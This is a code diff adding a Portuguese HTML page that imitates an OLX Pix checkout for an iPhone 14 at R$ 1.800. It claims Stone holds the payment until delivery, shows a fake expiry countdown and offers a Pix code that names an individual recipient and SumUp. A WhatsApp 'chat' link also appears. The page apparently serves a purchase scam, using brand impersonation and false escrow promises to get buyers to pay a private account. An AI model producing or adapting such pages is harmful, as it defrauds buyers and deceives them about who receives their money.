@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pagamento via Pix - OLX</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="icon" href="Olx (Site Divulgacao).jpeg" type="image/x-icon">
+ <style>
+    body {
+      font-family: 'Open Sans', sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px;
+      background-color: #fffcfc;
+      border-bottom: 1px solid #ddd;
+    }
+    .header .logo {
+      width: 80px;
+    }
+    .top-right-button {
+      border: 1px solid #ff7a00;
+      padding: 8px 12px;
+      border-radius: 20px;
+      color: #ff7a00;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      padding: 20px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+    .alert {
+      background-color: #fff7d9;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .highlight {
+      color: #ff7a00;
+      font-weight: 600;
+    }
+    .countdown {
+      font-weight: bold;
+      color: #ff7a00;
+    }
+    .countdown-box {
+      background-color: #ece9e9;
+      padding: 10px;
+      border-radius: 6px;
+      margin: 15px 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+    }
+    .countdown-box i {
+      color: #c9c9c9;
+    }
+    .pix-box {
+      display: flex;
+      justify-content: space-between;
+      border-top: 1px solid #ccc;
+      padding-top: 15px;
+      margin-top: 10px;
+    }
+    .pix-info {
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .pix-info i, .pix-info img {
+      width: 24px;
+      height: 24px;
+      font-size: 24px;
+    }
+    .steps {
+      margin: 20px 0;
+      font-size: 14px;
+    }
+    .qr-code {
+      display: flex;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    .pix-code-box {
+      background-color: #d9d7d7;
+      padding: 10px;
+      border-radius: 6px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+      word-break: break-all;
+    }
+    .copy-button {
+      background-color: #ff7a00;
+      color: rgb(255, 255, 255);
+      border: none;
+      padding: 10px 15px;
+      margin-top: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: 600;
+      width: 100%;
+    }
+    .copy-button:hover {
+      background-color: #e66e00;
+    }
+    
+    /* Estilo para a box onde vai o Tempo, Pague por Pix e Processado por Stone */
+    .info-box {
+      background-color: #f6f6f6;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    .info-box .countdown-box,
+    .info-box .pix-box {
+      margin-bottom: 10px;
+    }
+
+    @media (max-width: 640px) {
+      .container {
+        margin: 10px;
+        padding: 15px;
+      }
+      .pix-box {
+        flex-direction: column;
+        gap: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Cabeçalho separado com logo e botão -->
+  <div class="header">
+    <img src="Olx.jpeg" alt="Logo OLX" class="logo">
+    <a href="https://wa.me/message/GGPPZDLBVOQ3N1" class="top-right-button">Ir para o chat</a>
+
+  </div>
+
+  <div class="container">
+    <div class="alert">
+      ⚠️ A OLX, em parceria com a <strong>Stone</strong>, cuida do pagamento até você receber seu produto!
+    </div>
+
+    <!-- Box para Tempo, Pague por Pix e Processado por Stone -->
+    <div class="info-box">
+      <div class="countdown-box">
+        <i class="fa-regular fa-clock"></i>
+        <span><strong>Seu código expira em:</strong> <span class="countdown" id="timer">05m 00s</span></span>
+      </div>
+
+      <div class="pix-box">
+        <div class="pix-info">
+          <i class="fa-brands fa-pix"></i>
+          <div>
+            <strong>Pague por Pix</strong><br> R$ 1.800
+          </div>
+        </div>
+        <div class="pix-info">
+          <img src="Stone_pagamentos.png" alt="Zoop" style="background:white;border-radius: 10px; width: 70px; height: auto;">
+          <div>
+            <strong>Processado por</strong><br> Stone
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="steps">
+      <p>É rápido e prático. Veja como é fácil:</p>
+      <ol>
+        <li>Abra o app ou banco de sua preferência, escolha a opção pagar via Pix</li><br>
+        <li>Escolha pagar Pix com QR Code e escaneie o código abaixo:</li><br>
+        <li>Confira se o pagamento será feito para o banco parceiro <strong>Stone</strong> e se todas as informações estão corretas.</li><br>
+        <li>Confirme o pagamento.</li><br>
+      </ol>
+    </div>
+
+    <div class="qr-code">
+      <!-- Substitua a URL abaixo pela da sua API -->
+      <img src="iphone.jpeg" alt="QR Code Pix" id="pix-qr" width="220">
+    </div>
+
+    <p><strong>Ou se preferir, faça o pagamento com o Pix copia e cola</strong></p>
+    <p>Acesse o app do seu banco ou Internet Banking, escolha a opção pagar com <strong>Pix copia e cola</strong>. Depois cole o código, confira se o pagamento será feito para o banco parceiro <strong>Stone</strong> e se todas as informações estão corretas. Confirme o pagamento.</p>
+
+    <div class="pix-code-box" id="pix-code-box">
+      <span id="pix-code">00020126760014br.gov.bcb.pix013663f1082d-b795-4128-8328-515a3515d2560214IPHONE 14  OLX52040000530398654071800.005802BR5924Ketelly Goncalves Olivio6015Sao Jose do Rio62290525SUMUP2025053020162706334163045BD4</span>
+      <a href="#" onclick="copyPixCode()">Copiar</a>
+    </div>
+    <button class="copy-button" onclick="copyPixCode()">
+      <i class="fa-solid fa-copy"></i>
+       Copiar código Pix
+    </button>
+  </div>
+
+  <script>
+    function copyPixCode() {
+      const text = document.getElementById("pix-code").textContent;
+      navigator.clipboard.writeText(text);
+      alert("Código Pix copiado!");
+    }
+
+    let minutes = 4;
+    let seconds = 60;
+    const timerElement = document.getElementById("timer");
+
+    const interval = setInterval(() => {
+      seconds--;
+      if (seconds < 0) {
+        seconds = 59;
+        minutes--;
+      }
+
+      if (minutes < 0) {
+        clearInterval(interval);
+        timerElement.textContent = "Expirado";
+        return;
+      }
+
+      timerElement.textContent = `${String(minutes).padStart(2, "0")}m ${String(seconds).padStart(2, "0")}s`;
+    }, 1000);
+  </script>
+
+</body>
+</html>
